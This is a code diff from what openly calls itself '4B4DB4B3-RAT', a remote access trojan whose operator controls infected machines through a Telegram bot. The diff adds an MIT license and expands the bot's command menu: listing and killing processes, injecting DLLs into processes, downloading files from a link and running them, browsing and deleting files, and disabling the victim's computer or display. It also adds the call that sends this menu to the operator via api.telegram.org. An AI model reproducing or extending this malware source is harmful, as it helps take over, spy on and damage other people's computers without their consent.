@@ -1,6 +1,25 @@
 /*
-4B4DB4B3 (c) 2020
-15.10.2020
+MIT License
+
+Copyright (c) 2020 4B4DB4B3
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
 */
 
 #include "DlgProc.h"
@@ -118,25 +137,37 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 					char api[128], chatid[128];
 					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), api, 127);
 					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), chatid, 127);
-
-					std::string response;
 					
 					std::string path = "bot" + std::string(api) + "/getUpdates";
-					response = GetRequest("api.telegram.org", "4B4DB4B3", path.c_str());
+					GetRequest("api.telegram.org", "4B4DB4B3", path.c_str());
 
 					std::string text = "Hello! 4B4DB4B3-RAT was activated!%0A"
 						"%0A"
 						"Commands: %0A"
+						"%0AProcess manager: %0A"
 						"/user[ID] processes - get process list %0A"
-						"/user[ID] disable pc - disable computer of user %0A"
-						"/user[ID] close - close rat %0A"
+						"/user[ID] closeproc [processname.exe] - close process %0A"
+						"/user[ID] inject_dll [processname.exe] [C:\\Path\\To\\File.dll] - Inject dll into process %0A"
+
+						"%0AAuxiliary:%0A"
 						"/user[ID] loader [LINK] [PATH] - upload file from [LINK] to [PATH] %0A"
 						"/user[ID] run [PATH] [ARGS] - run file from [PATH] with arguments [ARGS]%0A"
-						
-						"/online - get users online";
-					path = "bot" + std::string(api) + "/sendMessage?chat_id=" + std::string(chatid) + "&text=" + text;
 
-					MessageBoxA(NULL, response.c_str(), chatid, MB_OK | MB_ICONINFORMATION);
+						"%0AJokes:%0A"
+						"/user[ID] disable pc - disable computer of user %0A"
+						"/user[ID] close - close rat %0A"
+						"/user[ID] disable display - disable display user %0A"
+
+						"%0AFile manager:%0A"
+						"/user[ID] dir [C:\\Folder] - show files and folders in directory %0A"
+						"/user[ID] dir del_file C:\\Path\\To\\File.exe - delete file into directory %0A"
+
+						"%0ARAT:%0A"
+						"/users - show online users%0A";
+						
+					path = "bot" + std::string(api) + "/sendMessage?chat_id=" + std::string(chatid) + "&text=" + text;
+					GetRequest("api.telegram.org", "B4DB4B3", path.c_str());
+
 					return 0;
 				}
 			}
